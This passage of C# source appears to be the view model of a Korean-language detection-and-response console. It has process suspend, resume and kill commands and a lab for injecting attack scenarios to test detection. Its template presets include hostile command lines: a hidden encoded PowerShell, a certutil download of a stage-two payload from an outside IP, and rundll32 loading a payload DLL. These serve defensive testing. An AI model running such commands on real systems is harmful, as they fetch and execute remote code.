    [RelayCommand]
    private void FocusProcessInGraph(uint pid)
    {
        CurrentView = CockpitViewType.ProcessGraph;
        var node = _treeManager.FindNodeByPid(pid);
        if (node != null)
        {
            _treeManager.EnsureNodeVisible(node);
            SelectedProcessNode = node;
        }
    }

    [RelayCommand]
    private void OpenInvestigationForProcess(uint pid)
    {
        var incident = Incidents.FirstOrDefault(x => x.TargetPid == pid);
        if (incident != null)
        {
            SelectedIncident = incident;
            CurrentView = CockpitViewType.Investigation;
        }
    }

    [RelayCommand]
    private async Task SuspendSelectedProcessAsync()
    {
        var node = SelectedProcessNode;
        if (node == null || !node.IsAlive) return;
        bool wasSuspended = node.IsSuspended;
        bool wasRestored = node.IsRestored;
        var cmd = new MitigationCommand
        {
            Action = ActionType.ActionSuspend,
            TargetPid = node.ProcessId,
            Reason = $"관제사 수동 원자적 동결 (PID: {node.ProcessId})"
        };
        await _uiBridge.SendManualCommandAsync(cmd);
        node.UpdateStatus(ProcessLifecycle.LifecycleSuspended, isSuspended: true, isTerminated: false);
        node.IsRestored = false;

        if (wasRestored && ActiveRestoredCount > 0)
        {
            ActiveRestoredCount--;
        }
        if (!wasSuspended)
        {
            ActiveSuspendedCount++;
        }
    }

    [RelayCommand]
    private async Task ResumeSelectedProcessAsync()
    {
        var node = SelectedProcessNode;
        if (node == null || !node.IsAlive) return;
        bool wasSuspended = node.IsSuspended;
        var cmd = new MitigationCommand
        {
            Action = ActionType.ActionResume,
            TargetPid = node.ProcessId,
            Reason = $"관제사 수동 동결 해제 (PID: {node.ProcessId})"
        };
        await _uiBridge.SendManualCommandAsync(cmd);
        node.UpdateStatus(ProcessLifecycle.LifecycleStart, isSuspended: false, isTerminated: false);
        if (wasSuspended)
        {
            node.IsRestored = true;
            if (ActiveSuspendedCount > 0)
            {
                ActiveSuspendedCount--;
            }
            ActiveRestoredCount++;
        }
    }

    [RelayCommand]
    private async Task TerminateSelectedProcessAsync()
    {
        var node = SelectedProcessNode;
        if (node == null || !node.IsAlive) return;
        bool wasSuspended = node.IsSuspended;
        bool wasRestored = node.IsRestored;
        var cmd = new MitigationCommand
        {
            Action = ActionType.ActionKill,
            TargetPid = node.ProcessId,
            Reason = $"관제사 수동 긴급 사살 (PID: {node.ProcessId})"
        };
        await _uiBridge.SendManualCommandAsync(cmd);
        node.UpdateStatus(ProcessLifecycle.LifecycleTerminated, isSuspended: false, isTerminated: true);
        node.IsRestored = false;

        if (wasSuspended && ActiveSuspendedCount > 0)
        {
            ActiveSuspendedCount--;
        }
        if (wasRestored && ActiveRestoredCount > 0)
        {
            ActiveRestoredCount--;
        }
        TotalTerminatedCount++;
        if (MonitoredProcessCount > 0)
        {
            MonitoredProcessCount--;
        }

        if (HideTerminatedProcesses)
        {
            _treeManager.RebuildVisibleNodes();
        }
    }

    [RelayCommand]
    private void RefreshProcessTree()
    {
        _treeManager.HideTerminated = HideTerminatedProcesses;
        if (!SensorConnected)
        {
            _treeManager.Clear();
            _treeManager.InitializeFromLocalOsSnapshot();
        }
        else
        {
            _treeManager.RebuildVisibleNodes();
        }
        OnPropertyChanged(nameof(RootProcesses));
        OnPropertyChanged(nameof(VisibleProcesses));
        MonitoredProcessCount = _treeManager.ActiveCount;
    }

    [RelayCommand]
    private void CopyText(string? text)
    {
        if (!string.IsNullOrEmpty(text))
        {
            try
            {
                System.Windows.Clipboard.SetText(text);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Clipboard Error] {ex.Message}");
            }
        }
    }

    [RelayCommand]
    private void SetLabMode(string mode)
    {
        SelectedLabMode = mode;
        OnPropertyChanged(nameof(IsModeGrpc));
        OnPropertyChanged(nameof(IsModeOs));
        OnPropertyChanged(nameof(IsModeLive));
        OnPropertyChanged(nameof(CurrentLabModeEnum));
        SimulatorLog += $"\n[{DateTime.Now:HH:mm:ss}] [모드 변경] 실행 모드가 '{mode.ToUpperInvariant()}' (으)로 변경되었습니다.";
    }

    [RelayCommand]
    private void ToggleArchitectureGuide()
    {
        IsArchitectureGuideVisible = !IsArchitectureGuideVisible;
    }

    [RelayCommand]
    private void CloseArchitectureGuide()
    {
        IsArchitectureGuideVisible = false;
    }

    [RelayCommand]
    private void SelectLabTab(string tabIndexStr)
    {
        if (int.TryParse(tabIndexStr, out int idx))
        {
            SelectedLabTab = idx;
            OnPropertyChanged(nameof(IsGoldenScenariosTab));
            OnPropertyChanged(nameof(IsCustomStudioTab));
        }
    }

    [RelayCommand]
    private void SetCustomExpectedAction(string action)
    {
        CustomExpectedAction = action;
    }

    [RelayCommand]
    private void ApplyCustomTemplate(string templateName)
    {
        switch (templateName.ToLowerInvariant())
        {
            case "powershell":
                CustomTargetImage = "powershell.exe";
                CustomParentImage = "winword.exe";
                CustomCommandLine = "powershell.exe -w hidden -enc JABjAGwAYQBzAHMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOw...";
                CustomMitreTactic = "T1059.001 (Command and Scripting Interpreter: PowerShell)";
                CustomExpectedAction = "ACTION_KILL";
                CustomIsSuspended = true;
                break;
            case "certutil":
                CustomTargetImage = "certutil.exe";
                CustomParentImage = "excel.exe";
                CustomCommandLine = "certutil.exe -urlcache -split -f http://185.220.101.5/stage2.hta C:\\Windows\\Temp\\stage2.hta";
                CustomMitreTactic = "T1105 (Ingress Tool Transfer)";
                CustomExpectedAction = "ACTION_KILL";
                CustomIsSuspended = true;
                break;
            case "rundll32":
                CustomTargetImage = "rundll32.exe";
                CustomParentImage = "cmd.exe";
                CustomCommandLine = "rundll32.exe C:\\Windows\\Temp\\payload.dll,DllRegisterServer";
                CustomMitreTactic = "T1218.011 (System Binary Proxy Execution: Rundll32)";
                CustomExpectedAction = "ACTION_KILL";
                CustomIsSuspended = true;
                break;
            case "benign":
                CustomTargetImage = "powershell.exe";
                CustomParentImage = "explorer.exe";
                CustomCommandLine = "powershell.exe -NoProfile -Command \"Get-Service | Where-Object {$_.Status -eq 'Running'}\"";
                CustomMitreTactic = "Known-Good Baseline (Admin Query)";
                CustomExpectedAction = "ACTION_RESUME";
                CustomIsSuspended = false;
                break;
        }
        SimulatorLog += $"\n[{DateTime.Now:HH:mm:ss}] [템플릿 적용] '{templateName}' 프리셋 파라미터가 공작소에 로드되었습니다.";
    }

    [RelayCommand]
    private async Task RunCurrentScenarioAsync()
    {
        if (SelectedScenario == null) return;
        if (SelectedScenario.Id == CustomScenarioId)
        {
            await RunCustomScenarioAsync();
        }
        else
        {
            await RunScenarioAsync(SelectedScenario.Id);
        }
    }

    [RelayCommand]
    private async Task RunScenarioAsync(int scenarioId)
    {
        var sc = Scenarios.FirstOrDefault(s => s.Id == scenarioId);
        if (sc == null) return;

        var fullSc = AttackScenarioRegistry.FindById(scenarioId) ?? new AttackScenario
        {
            Id = sc.Id,
            Name = sc.Name,
            Description = sc.Description,
            ExpectedAction = sc.ExpectedAction,
            BuildBatch = pid => new TelemetryBatch()
        };

        LatestScenarioName = $"#{sc.Id}: {sc.Name}";
        LatestVerdictStatus = "IN_PROGRESS";
        LatestLatencyText = "측정 중...";
        LatestTurnCountText = "추론 중...";
        LatestToolsText = "도구 체인 탐색 중...";
        LatestConfidenceText = "-";
        LatestAssertionText = $"시나리오 #{sc.Id} 주입 시작 (모드: {SelectedLabMode.ToUpperInvariant()})...";

        SimulatorLog = $"[{DateTime.Now:HH:mm:ss}] [시뮬레이션 개시] 시나리오 {sc.Id}: {sc.Name}\n" +
                       $" - 설명: {sc.Description}\n" +
                       $" - 기대 처분: {sc.ExpectedAction}\n" +
                       $" - 실행 모드: {SelectedLabMode.ToUpperInvariant()} ({(IsModeLive ? "전문가 라이브 OS 실행" : (IsModeOs ? "실제 OS 안전 프로세스 연동" : "Clean-Room 가상 주입"))})\n" +
                       $" - 상태: 텔레메트리 스트림 인프로세스 전송 중...";

        try
        {
            var result = await _labRunner.ExecuteScenarioAsync(fullSc, CurrentLabModeEnum);
            _recentLabResults.Add(result);

            LatestVerdictStatus = result.IsPass ? (sc.ExpectedAction == "ACTION_KILL" ? "PASS" : "BENIGN") : "FAIL";
            LatestLatencyText = $"{result.Elapsed.TotalMilliseconds:F1} ms";
            LatestTurnCountText = $"{result.TurnCount} 턴";
            LatestToolsText = result.ToolChain;
            LatestConfidenceText = $"{result.Confidence * 100:F1}%";
            LatestAssertionText = result.AssertionMessage;

            foreach (var line in result.LogEntries)
            {
                SimulatorLog += $"\n{line}";
            }
        }
        catch (Exception ex)
        {
            LatestVerdictStatus = "FAIL";
            LatestAssertionText = $"FAIL: 오류 발생 - {ex.Message}";
            SimulatorLog += $"\n[오류] {ex.Message}";
        }
    }

    [RelayCommand]
    private async Task RunCustomScenarioAsync()
    {
        LatestScenarioName = $"커스텀: {CustomTargetImage}";
        LatestVerdictStatus = "IN_PROGRESS";
        LatestLatencyText = "측정 중...";
        LatestTurnCountText = "추론 중...";
        LatestToolsText = "도구 체인 탐색 중...";
        LatestConfidenceText = "-";
        LatestAssertionText = $"커스텀 공격 페이로드 주입 및 분석 중... (부모: {CustomParentImage}, 타깃: {CustomTargetImage})";

        SimulatorLog = $"[{DateTime.Now:HH:mm:ss}] [커스텀 침해 주입 개시]\n" +
                       $" - 타깃 프로세스 : {CustomTargetImage}\n" +
                       $" - 부모 프로세스 : {CustomParentImage}\n" +
                       $" - 명령줄       : {CustomCommandLine}\n" +
                       $" - MITRE 전술    : {CustomMitreTactic}\n" +
                       $" - 기대 처분     : {CustomExpectedAction}\n" +
                       $" - 실행 모드     : {SelectedLabMode.ToUpperInvariant()}\n" +
                       $" - 상태         : 텔레메트리 스트림 전송 중...";

        try
        {
            var result = await _labRunner.ExecuteCustomScenarioAsync(
                CustomTargetImage,
                CustomParentImage,
                CustomCommandLine,
                CustomMitreTactic,
                CustomExpectedAction,
                CurrentLabModeEnum);

            _recentLabResults.Add(result);

            LatestVerdictStatus = result.IsPass ? (CustomExpectedAction == "ACTION_KILL" ? "PASS" : "BENIGN") : "FAIL";
            LatestLatencyText = $"{result.Elapsed.TotalMilliseconds:F1} ms";
            LatestTurnCountText = $"{result.TurnCount} 턴";
            LatestToolsText = result.ToolChain;
            LatestConfidenceText = $"{result.Confidence * 100:F1}%";
            LatestAssertionText = result.AssertionMessage;

            foreach (var line in result.LogEntries)
            {
                SimulatorLog += $"\n{line}";
            }
        }
        catch (Exception ex)
        {
            LatestVerdictStatus = "FAIL";
            LatestAssertionText = $"FAIL: {ex.Message}";
            SimulatorLog += $"\n[오류] {ex.Message}";
        }
    }

    [RelayCommand]
    private async Task RunAllScenariosBatchAsync()
    {
        LatestScenarioName = "1~10번 전 시나리오 일괄 회귀 테스트";
        LatestVerdictStatus = "IN_PROGRESS";
        LatestLatencyText = "집계 중...";
        LatestTurnCountText = "순차 완주 중...";
        LatestToolsText = "5대 포렌식 도구 풀체인";
        LatestConfidenceText = "평가 중...";
        LatestAssertionText = "1~10번 전 시나리오 순차 실측 주입 및 자동 어설션이 진행 중입니다...";

        SimulatorLog = $"[{DateTime.Now:HH:mm:ss}] [전 시나리오 일괄 회귀 테스트 개시] 1~10번 순차 주입 시작...\n" +
                       $"================================================================================";

        int passed = 0;
        int total = 0;
        double totalMs = 0;
        int totalTurns = 0;

        foreach (var sc in Scenarios.Where(s => s.Id != CustomScenarioId))
        {
            var fullSc = AttackScenarioRegistry.FindById(sc.Id);
            if (fullSc == null) continue;

            total++;
            SimulatorLog += $"\n[{DateTime.Now:HH:mm:ss}] ▶ 시나리오 #{fullSc.Id}: {fullSc.Name} 주입 중...";

            try
            {
                var result = await _labRunner.ExecuteScenarioAsync(fullSc, CurrentLabModeEnum);
                _recentLabResults.Add(result);

                totalMs += result.Elapsed.TotalMilliseconds;
                totalTurns += result.TurnCount;
                if (result.IsPass) passed++;

                SimulatorLog += $" ➔ [{(result.IsPass ? "PASS" : "FAIL")}] (소요: {result.Elapsed.TotalMilliseconds:F1}ms, 턴: {result.TurnCount}, 판결: {result.ActualAction})";
            }
            catch (Exception ex)
            {
                SimulatorLog += $" ➔ [오류] {ex.Message}";
            }
        }

        bool allPassed = total > 0 && passed == total;
        LatestVerdictStatus = allPassed ? "PASS" : "FAIL";
        LatestLatencyText = total > 0 ? $"평균 {(totalMs / total):F1} ms" : "0 ms";
        LatestTurnCountText = total > 0 ? $"평균 {((double)totalTurns / total):F1} 턴" : "0 턴";
        LatestToolsText = "5대 도구 전수 매핑 완주";
        LatestConfidenceText = "실측 100% 집계";
        LatestAssertionText = $"전체 {total}개 시나리오 중 {passed}개 통과 (성공률: {(total > 0 ? (double)passed / total * 100 : 0):F1}%).";

        SimulatorLog += $"\n================================================================================\n" +
                        $"[{DateTime.Now:HH:mm:ss}] [회귀 테스트 완주] 총 {total}개 중 {passed}개 통과 (성공률: {(total > 0 ? (double)passed / total * 100 : 0):F1}%)\n" +
                        $"감사 로그가 준비되었습니다. '리포트 덤프'를 통해 JSON 파일로 저장할 수 있습니다.";
    }

    [RelayCommand]
    private async Task ExportAuditReportAsync()
    {
        try
        {
            var resultsToExport = _recentLabResults.Count > 0 ? _recentLabResults : new List<ScenarioExecutionResult>();
            string savedPath = await _labRunner.ExportAuditReportAsync(resultsToExport);
            SimulatorLog += $"\n[{DateTime.Now:HH:mm:ss}] [감사 보고서 출력] 포렌식 감사 기록({resultsToExport.Count}건)이 디스크에 저장되었습니다.\n" +
                            $" ➔ 저장 경로: {savedPath} (Exit Code 0)";
        }
        catch (Exception ex)
        {
            SimulatorLog += $"\n[{DateTime.Now:HH:mm:ss}] [리포트 출력 오류] {ex.Message}";
        }
    }

    [RelayCommand]
    private void ClearSimulatorLog()
    {
        SimulatorLog = $"[{DateTime.Now:HH:mm:ss}] 방어 검증 로그가 초기화되었습니다. 시나리오를 선택하여 주입하십시오.";
        _recentLabResults.Clear();
    }
}
